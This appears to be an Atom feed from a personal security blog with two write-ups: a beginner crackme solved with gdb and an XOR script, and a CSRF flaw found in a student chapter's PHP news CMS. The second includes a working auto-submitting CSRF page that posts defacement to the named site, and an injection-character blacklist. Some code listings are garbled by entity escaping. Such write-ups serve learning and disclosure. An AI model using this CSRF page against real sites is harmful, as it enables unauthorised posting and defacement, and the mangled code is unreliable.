@@ -1,0 +1,655 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Security | Mark Mossberg's Blog]]></title>
+  <link href="http://blog.mark.lc/blog/categories/security/atom.xml" rel="self"/>
+  <link href="http://blog.mark.lc/"/>
+  <updated>2014-12-11T23:43:57-05:00</updated>
+  <id>http://blog.mark.lc/</id>
+  <author>
+    <name><![CDATA[Mark Mossberg]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Beginner Crackme]]></title>
+    <link href="http://blog.mark.lc/blog/2014/10/27/crackme/"/>
+    <updated>2014-10-27T00:00:00-04:00</updated>
+    <id>http://blog.mark.lc/blog/2014/10/27/crackme</id>
+    <content type="html"><![CDATA[<p>As part of an Intro to Security course I&rsquo;m taking, my professor gave us
+a crackme style exercise to practice reading x86 assembly and basic
+reverse engineering.</p>
+
+<p>The program is pretty simple. It accepts a password as an argument and we&rsquo;re
+told that if the password is correct, &ldquo;ok&rdquo; is printed.</p>
+
+<pre><code>$ ./crackme
+usage: ./crackme &lt;secret&gt;
+$ ./crackme test
+$
+</code></pre>
+
+<p>As usual, I start by running <code>file</code> on the binary, which shows that it&rsquo;s a
+standard x64 ELF binary. <code>file</code> also says that the binary is &ldquo;not stripped&rdquo;, which means
+that it includes symbols. All I really know about symbols are that they can
+include debugging information about a binary like function and variable names
+and some symbols aren&rsquo;t really necessary; they can be stripped out to reduce
+the binary&rsquo;s size and make reverse engineering more challenging. Maybe I&rsquo;ll
+do a more in depth post on this in the future.</p>
+
+<pre><code>$ file crackme
+crackme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=0x3fcf895b7865cb6be6b934640d1519a1e6bd6d39, not stripped
+</code></pre>
+
+<p>Next, I run <code>strings</code>, hoping to get lucky and find the password amongst the
+strings in the binary. Strings looks for series of printable characters followed
+by a NULL, but unfortunately nothing here works as the password.</p>
+
+<pre><code>$ strings crackme
+/lib64/ld-linux-x86-64.so.2
+exd4
+libc.so.6
+puts
+printf
+memcmp
+__libc_start_main
+__gmon_start__
+GLIBC_2.2.5
+fffff.
+AWAVA
+AUATL
+[]A\A]A^A_
+usage: %s &lt;secret&gt;
+;*3$"
+</code></pre>
+
+<p>Since that didn&rsquo;t work, we&rsquo;re forced to disassemble the binary and
+actually try to reverse engineer it.
+We&rsquo;ll start with <code>main</code>.</p>
+
+<pre><code class="asm">$ gdb -batch -ex 'file crackme' -ex 'disas main'
+Dump of assembler code for function main:
+   0x00000000004004a0 &lt;+0&gt;:     sub    rsp,0x8
+   0x00000000004004a4 &lt;+4&gt;:     cmp    edi,0x1
+   0x00000000004004a7 &lt;+7&gt;:     jle    0x4004c7 &lt;main+39&gt;
+   0x00000000004004a9 &lt;+9&gt;:     mov    rdi,QWORD PTR [rsi+0x8]
+   0x00000000004004ad &lt;+13&gt;:    call   0x4005e0 &lt;verify_secret&gt;
+   0x00000000004004b2 &lt;+18&gt;:    test   eax,eax
+   0x00000000004004b4 &lt;+20&gt;:    je     0x4004c2 &lt;main+34&gt;
+   0x00000000004004b6 &lt;+22&gt;:    mov    edi,0x4006e8
+   0x00000000004004bb &lt;+27&gt;:    call   0x400450 &lt;puts@plt&gt;
+   0x00000000004004c0 &lt;+32&gt;:    xor    eax,eax
+   0x00000000004004c2 &lt;+34&gt;:    add    rsp,0x8
+   0x00000000004004c6 &lt;+38&gt;:    ret
+   0x00000000004004c7 &lt;+39&gt;:    mov    rsi,QWORD PTR [rsi]
+   0x00000000004004ca &lt;+42&gt;:    mov    edi,0x4006d4
+   0x00000000004004cf &lt;+47&gt;:    xor    eax,eax
+   0x00000000004004d1 &lt;+49&gt;:    call   0x400460 &lt;printf@plt&gt;
+   0x00000000004004d6 &lt;+54&gt;:    mov    eax,0x1
+   0x00000000004004db &lt;+59&gt;:    jmp    0x4004c2 &lt;main+34&gt;
+End of assembler dump.
+</code></pre>
+
+<p>Let&rsquo;s break this down a little.</p>
+
+<pre><code class="asm">    0x00000000004004a0 &lt;+0&gt;:     sub    rsp,0x8
+    0x00000000004004a4 &lt;+4&gt;:     cmp    edi,0x1
+    0x00000000004004a7 &lt;+7&gt;:     jle    0x4004c7 &lt;main+39&gt;
+</code></pre>
+
+<p>Starting at the beginning, we see the stack pointer decremented as part of
+the function prologue. The prologue is a set of setup steps involving
+saving the old frame&rsquo;s
+base pointer on the stack, reassigning the base pointer to the current
+stack pointer, then subtracting the stack pointer a certain amount to make room
+on the stack
+for local variables, etc. We don&rsquo;t see the former two steps because this is
+the main function so it doesn&rsquo;t <em>really</em> have a function calling it, so saving/setting
+the base pointer isn&rsquo;t necessary.</p>
+
+<p>Then the <code>edi</code> register is
+compared to 1 and if it is less than or equal, we jump to offset 39.</p>
+
+<pre><code class="asm">   0x00000000004004c2 &lt;+34&gt;:    add    rsp,0x8
+   0x00000000004004c6 &lt;+38&gt;:    ret
+   0x00000000004004c7 &lt;+39&gt;:    mov    rsi,QWORD PTR [rsi]
+   0x00000000004004ca &lt;+42&gt;:    mov    edi,0x4006d4
+   0x00000000004004cf &lt;+47&gt;:    xor    eax,eax
+   0x00000000004004d1 &lt;+49&gt;:    call   0x400460 &lt;printf@plt&gt;
+   0x00000000004004d6 &lt;+54&gt;:    mov    eax,0x1
+   0x00000000004004db &lt;+59&gt;:    jmp    0x4004c2 &lt;main+34&gt;
+</code></pre>
+
+<p>Here at offset 39, we print something then jump to offset 34 where we repair
+the stack (undo the sub instruction from the prologue) and return (ending
+execution).</p>
+
+<p>This is likely how the program checks the arguments and prints the usage
+message if no arguments are supplied (which would cause argc/edi to be 1).</p>
+
+<p>However if we supply an argument, <code>edi</code> is 0x2 and we move past the <code>jle</code>
+instruction.</p>
+
+<pre><code class="asm">   0x00000000004004a9 &lt;+9&gt;:     mov    rdi,QWORD PTR [rsi+0x8]
+   0x00000000004004ad &lt;+13&gt;:    call   0x4005e0 &lt;verify_secret&gt;
+</code></pre>
+
+<p>Here we can see the <code>verify_secret</code> function being called with a parameter
+in <code>rdi</code>. This is most likely the argument we passed into the program. We can
+confirm this with gdb (I&rsquo;m using it with <a href="http://ropshell.com/peda/">peda</a> here).</p>
+
+<pre><code>gdb-peda$ tele $rsi
+0000| 0x7fffffffeb48 --&gt; 0x7fffffffed6e ("/home/vagrant/crackme/crackme")
+0008| 0x7fffffffeb50 --&gt; 0x7fffffffed8c --&gt; 0x4548530074736574 ('test')
+0016| 0x7fffffffeb58 --&gt; 0x0
+</code></pre>
+
+<p>Indeed <code>rsi</code> points to the first element of <code>argv</code>, so incrementing that by 8 bytes
+(because 64 bit) points to <code>argv[1]</code>, which is our input.</p>
+
+<p>If we look after the <code>verify_secret</code> call we can see the program checks
+if <code>eax</code> is 0 and if it is, jumps to offset 34, ending the program. However, if
+<code>eax</code> is not zero, we&rsquo;ll hit a <code>puts</code> call before exiting, which will presumably
+print out the &ldquo;ok&rdquo; message we want.</p>
+
+<pre><code class="asm">   0x00000000004004b2 &lt;+18&gt;:    test   eax,eax
+   0x00000000004004b4 &lt;+20&gt;:    je     0x4004c2 &lt;main+34&gt;
+   0x00000000004004b6 &lt;+22&gt;:    mov    edi,0x4006e8
+   0x00000000004004bb &lt;+27&gt;:    call   0x400450 &lt;puts@plt&gt;
+   0x00000000004004c0 &lt;+32&gt;:    xor    eax,eax
+   0x00000000004004c2 &lt;+34&gt;:    add    rsp,0x8
+   0x00000000004004c6 &lt;+38&gt;:    ret
+</code></pre>
+
+<p>Now lets disassemble <code>verify_secret</code> to see how the input validation is performed,
+and to see how we can make it return non-zero.</p>
+
+<pre><code class="asm">Dump of assembler code for function verify_secret:
+   0x00000000004005e0 &lt;+0&gt;:     sub    rsp,0x408
+   0x00000000004005e7 &lt;+7&gt;:     movzx  eax,BYTE PTR [rdi]
+   0x00000000004005ea &lt;+10&gt;:    mov    rcx,rsp
+   0x00000000004005ed &lt;+13&gt;:    test   al,al
+   0x00000000004005ef &lt;+15&gt;:    je     0x400622 &lt;verify_secret+66&gt;
+   0x00000000004005f1 &lt;+17&gt;:    mov    rdx,rsp
+   0x00000000004005f4 &lt;+20&gt;:    jmp    0x400604 &lt;verify_secret+36&gt;
+   0x00000000004005f6 &lt;+22&gt;:    nop    WORD PTR cs:[rax+rax*1+0x0]
+   0x0000000000400600 &lt;+32&gt;:    test   al,al
+   0x0000000000400602 &lt;+34&gt;:    je     0x400622 &lt;verify_secret+66&gt;
+   0x0000000000400604 &lt;+36&gt;:    xor    eax,0xfffffff7
+   0x0000000000400607 &lt;+39&gt;:    lea    rsi,[rsp+0x400]
+   0x000000000040060f &lt;+47&gt;:    add    rdx,0x1
+   0x0000000000400613 &lt;+51&gt;:    mov    BYTE PTR [rdx-0x1],al
+   0x0000000000400616 &lt;+54&gt;:    add    rdi,0x1
+   0x000000000040061a &lt;+58&gt;:    movzx  eax,BYTE PTR [rdi]
+   0x000000000040061d &lt;+61&gt;:    cmp    rdx,rsi
+   0x0000000000400620 &lt;+64&gt;:    jb     0x400600 &lt;verify_secret+32&gt;
+   0x0000000000400622 &lt;+66&gt;:    mov    edx,0x18
+   0x0000000000400627 &lt;+71&gt;:    mov    esi,0x600a80
+   0x000000000040062c &lt;+76&gt;:    mov    rdi,rcx
+   0x000000000040062f &lt;+79&gt;:    call   0x400480 &lt;memcmp@plt&gt;
+   0x0000000000400634 &lt;+84&gt;:    test   eax,eax
+   0x0000000000400636 &lt;+86&gt;:    sete   al
+   0x0000000000400639 &lt;+89&gt;:    add    rsp,0x408
+   0x0000000000400640 &lt;+96&gt;:    movzx  eax,al
+   0x0000000000400643 &lt;+99&gt;:    ret
+End of assembler dump.
+</code></pre>
+
+<p>I won&rsquo;t walk through this one in detail because understanding each line
+isn&rsquo;t necessary to crack this. Let&rsquo;s skip to
+the memcmp call. If memcmp returns 0, <code>eax</code> is set to 1 and the function
+returns. This is exactly what we want. From the man page, <code>memcmp</code> takes three
+parameters, two buffers to compare and their lengths, and returns 0 if the
+buffers are identical.</p>
+
+<pre><code class="asm">   0x0000000000400622 &lt;+66&gt;:    mov    edx,0x18
+   0x0000000000400627 &lt;+71&gt;:    mov    esi,0x600a80
+   0x000000000040062c &lt;+76&gt;:    mov    rdi,rcx
+   0x000000000040062f &lt;+79&gt;:    call   0x400480 &lt;memcmp@plt&gt;
+</code></pre>
+
+<p>Here&rsquo;s the setup to the <code>memcmp</code> call. We can see the third parameter for length
+is the immediate 0x18 meaning the buffers will be 24 bytes in length. If we
+examine address 0x600a80, we find this 24 byte string:</p>
+
+<pre><code>gdb-peda$ hexd 0x600a80 /2
+0x00600a80 : 91 bf a4 85 85 c3 ba b9 9f a6 b6 b1 93 b9 83 8f   ................
+0x00600a90 : ae b1 ae c1 bc 80 ca ca 00 00 00 00 00 00 00 00   ................
+</code></pre>
+
+<p>Since this is a direct address to some memory, we can be fairly certain that
+we&rsquo;ve found some sort of secret value! Based on the <code>movzx eax,BYTE PTR [rdi]</code>
+instruction (offset 7)
+which moves a byte from the input string into eax, the <code>xor eax, 0xfffffff7</code>
+instruction (offset 36), and
+the <code>add rdi, 0x1</code> instruction (offset 54) which increments the char*
+pointer to our input string, we can reasonably guess
+that this function is xor&#8217;ing each character of our input with 0xf7 and writing
+the result into a buffer which begins at <code>rsp</code> (also pointed to by <code>rcx</code>). Since
+we now know the secret (<code>\x91\xbf\xa4\x85...</code>) and the xor key (<code>0xf7</code>) it&rsquo;s
+pretty easy to extract the password we need by xor&#8217;ing each byte of the secret
+with the xor key.</p>
+
+<p>Here&rsquo;s a way to do this with python.</p>
+
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="nb">str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x91</span>\<span class="n">xbf</span>\<span class="n">xa4</span>\<span class="n">x85</span>\<span class="n">x85</span>\<span class="n">xc3</span>\<span class="n">xba</span>\<span class="n">xb9</span>\<span class="n">x9f</span>\<span class="n">xa6</span>\<span class="n">xb6</span>\<span class="n">xb1</span>\<span class="n">x93</span>\<span class="n">xb9</span>\<span class="n">x83</span>\<span class="n">x8f</span>\<span class="n">xae</span>\<span class="n">xb1</span>\<span class="n">xae</span>\<span class="n">xc1</span>\<span class="n">xbc</span>\<span class="n">x80</span>\<span class="n">xca</span>\<span class="n">xca</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+<span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ba</span><span class="p">):</span>
+    <span class="n">ba</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xf7</span>
+<span class="k">print</span> <span class="n">ba</span></code></pre></div></p>
+
+<p>Which results in this:</p>
+
+<pre><code>$ python crack.py
+fHSrr4MNhQAFdNtxYFY6Kw==
+$ ./crackme fHSrr4MNhQAFdNtxYFY6Kw==
+ok
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Abusing Admin Privileges via CSRF]]></title>
+    <link href="http://blog.mark.lc/blog/2014/09/11/csrf-news/"/>
+    <updated>2014-09-11T00:00:00-04:00</updated>
+    <id>http://blog.mark.lc/blog/2014/09/11/csrf-news</id>
+    <content type="html"><![CDATA[<p><em>Exploiting a classic CSRF vulnerability</em></p>
+
+<p>When I took over responsibility as the webmaster for
+<a href="http://www.ieee.neu.edu">Northeastern University&rsquo;s IEEE student chapter</a> around
+January 2014 (yes, this is a very belated post), I was suddenly reponsible for
+maintaining a custom LAMP stack Content Management System (CMS) whose core
+functionality was letting an admin post to a news feed on the front page of the
+site.
+This site has since been completely redone, but given that it is notoriously
+difficult to program securely in PHP, I decided to poke around a little and
+see if I could find any cool bugs.</p>
+
+<p>Initially, I started looking for the most blatant web vulns, SQLi and XSS, but
+was pleasantly surprised to find in the <code>register.php</code> file, for example, that
+handles user registration, to find a input sanitation check.</p>
+
+<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">((</span><span class="nx">isValid</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">newusername</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;(</span><span class="nx">isValid</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">newpassword</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])))</span>
+<span class="p">{</span>
+    <span class="c1">// continue with registration</span>
+<span class="p">}</span></code></pre></div></p>
+
+<p>where <code>isValid()</code> looks like</p>
+
+<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">isValid</span><span class="p">(</span><span class="nv">$varx</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$valid</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+    <span class="nv">$bad_stuff</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="c1">#&amp;rdquo;,&amp;ldquo;(&amp;rdquo;,&amp;ldquo;)&amp;rdquo;,&amp;ldquo;&amp;lt;&amp;rdquo;,&amp;ldquo;&gt;&amp;rdquo;,&amp;ldquo;?&amp;rdquo;,&amp;ldquo;/&amp;rdquo;,&amp;ldquo;\&amp;rdquo;,&amp;ldquo;[&amp;rdquo;,&amp;ldquo;]&amp;rdquo;,&amp;ldquo;|&amp;rdquo;,&amp;ldquo;$&amp;rdquo;,&amp;ldquo;&amp;lsquo;&amp;rdquo;,&amp;ldquo;:&amp;rdquo;,&amp;ldquo;;&amp;rdquo;, &amp;ldquo;@&amp;rdquo;);</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$index</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$varx</span><span class="p">);</span> <span class="nv">$index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$varx</span><span class="p">,</span><span class="nv">$index</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="nv">$bad_stuff</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$valid</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$varx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span> <span class="p">{</span>
+        <span class="nv">$valid</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$valid</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div></p>
+
+<p>This code has a pretty substantial blacklist of commonly used characters in
+injections and operates by iterating over each character of the questionable
+input and testing if the character is in the blacklist, if so, setting the
+<code>$valid</code> variable to false. This seems to be an effective technique at ensuring
+the input is safe to use, however OWASP tends to <a href="https://www.owasp.org/index.php/Data_Validation#Data_Validation_Strategies">discourage</a>
+this model.</p>
+
+<p>After ruling this out of potential vulns, I looked a little deeper into the code
+that powered the posting of news to the website, <code>add-news.php</code>.</p>
+
+<p>Here we can see that if the HTTP request is a &ldquo;POST&rdquo; and the PHP session variables
+&ldquo;isadmin&rdquo; and &ldquo;isofficer&rdquo; are set to &ldquo;yessir&rdquo; and &ldquo;true&rdquo; respectively, then
+the code that adds news gets executed.</p>
+
+<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SERVER</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">REQUEST_METHOD</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">POST</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span>
+    <span class="p">{</span>
+        <span class="k">include</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ieee</span><span class="o">-</span><span class="nx">lib</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isadmin</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])</span> <span class="o">||</span> <span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isofficer</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span>
+        <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isadmin</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">yessir</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isofficer</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="k">true</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span>
+            <span class="p">{</span>
+                <span class="c1">// add news</span></code></pre></div></p>
+
+<p>After these access checks pass, the POST request data is processed and
+ultimately a SQL query string is generated.</p>
+
+<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="c1">// continued from above</span>
+<span class="nv">$title</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">news_title</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;],</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
+<span class="nv">$text</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">post</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;],</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
+<span class="p">{</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="p">}</span> <span class="c1">// some omitted stuff</span>
+<span class="nv">$user_query</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="nx">user_id</span><span class="p">,</span> <span class="nx">username</span> <span class="nx">FROM</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span> <span class="o">.</span> <span class="nv">$INFO</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">sql_prefix</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">.</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">users</span> <span class="nx">WHERE</span> <span class="nx">username</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&amp;rsquo;] . &amp;ldquo;&amp;lsquo;&amp;rdquo;;</span>
+<span class="s1">$user_result = mysql_query($user_query);</span>
+<span class="s1">if($user_result)</span>
+<span class="s1">{</span>
+<span class="s1">    //Returns an array with the data from the SQL select statement</span>
+<span class="s1">    $user_row = mysql_fetch_row($user_result);&lt;/p&gt;</span>
+
+<span class="s1">&lt;pre&gt;&lt;code&gt;$query1 = &quot;INSERT INTO &quot; . $INFO[&#39;</span><span class="nx">sql_prefix</span><span class="s1">&#39;] . &quot;news (news_title, news_type, time_posted, time_meeting, news_body, author_id, author_name, meeting_location) &quot;;</span>
+<span class="s1">$query2 = &quot;VALUES (&#39;</span><span class="s2">&quot; . </span><span class="si">$title</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$type_of_news</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . time() . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$time_of_meeting</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$text</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$user_row[0]</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$user_row[1]</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$meetinglocation</span><span class="s2"> . &quot;</span><span class="s1">&#39;)&quot;;</span>
+<span class="s1">$add_news_query = $query1 . $query2;</span>
+<span class="s1">$add_news_result = mysql_query($add_news_query);</span>
+
+<span class="s1">if($add_news_result)</span>
+<span class="s1">{</span>
+<span class="s1">    header(&#39;</span><span class="nx">Location</span><span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="nx">www</span><span class="o">.</span><span class="nx">ieee</span><span class="o">.</span><span class="nx">neu</span><span class="o">.</span><span class="nx">edu</span><span class="o">/?</span><span class="nx">page</span><span class="o">=</span><span class="nx">addnews</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="nx">success</span><span class="o">=</span><span class="k">true</span><span class="s1">&#39;);</span>
+<span class="s1">}</span>
+<span class="s1">else</span>
+<span class="s1">{</span>
+<span class="s1">    header(&#39;</span><span class="nx">Location</span><span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="nx">www</span><span class="o">.</span><span class="nx">ieee</span><span class="o">.</span><span class="nx">neu</span><span class="o">.</span><span class="nx">edu</span><span class="o">/?</span><span class="nx">page</span><span class="o">=</span><span class="nx">addnews</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="nx">error</span><span class="o">=</span><span class="nx">unable_to_post_news</span><span class="err">&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">}</span>
+<span class="c1">// done</span></code></pre></div></p>
+
+<p>The important part to notice here is that there is no code that ensures the
+legitimacy of the request, that is, that a currently authenticated admin
+user actually meant to make this request. In this scenario if we can somehow
+find a way to get the admin to
+submit an arbitrary POST request to the <code>add-news.php</code> page, since she already
+has the session all set up in her browser, we can bypass the session checks
+previously shown and add arbitrary news to the website, for example.</p>
+
+<p>You might be wondering how we can get the admin to submit arbitrary POST requests
+without her noticing. The most obvious answer is physical access to the her
+machine while she&rsquo;s away or something, but a much more realistic scenario
+would be if we would get the admin
+to browse to a web page that we (the attacker) control, we can use some nifty
+JavaScript magic to get her to automatically submit the proper POST request
+on our behalf.</p>
+
+<p>This is called <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF">Cross Site Request Forgery</a>).</p>
+
+<p>It turns out that these types of malicious pages are actually very simple
+to write. Remember, all that&rsquo;s really needed is JavaScript execution, so
+for example if you had previous knowledge of a site that the admin frequented
+that had an XSS vulnerability, that would be a perfect way to chain these attacks.
+Anyway, here&rsquo;s an example malicious page <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>
+
+<p><div class="highlight"><pre><code class="language-html" data-lang="html"><span class="ni">&amp;lt;</span>!DOCTYPE HTML&gt;
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;h1&gt;</span>non-malicious website! :)<span class="nt">&lt;/h1&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">&quot;thisform&quot;</span> <span class="na">action=</span><span class="s">&quot;http://www.ieee.neu.edu/add-news.php&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span>
+          <span class="na">style=</span><span class="s">&quot;display:none;&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;news_title&quot;</span> <span class="na">value=</span><span class="s">&quot;breaking news: u got hacked&quot;</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;post&quot;</span> <span class="na">value=</span><span class="s">&quot;insert website defacement here&quot;</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">charset=</span><span class="s">&quot;utf-8&quot;</span><span class="nt">&gt;</span>
+        <span class="kd">var</span> <span class="nx">frm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">thisform</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
+        <span class="nx">frm</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
+    <span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span></code></pre></div></p>
+
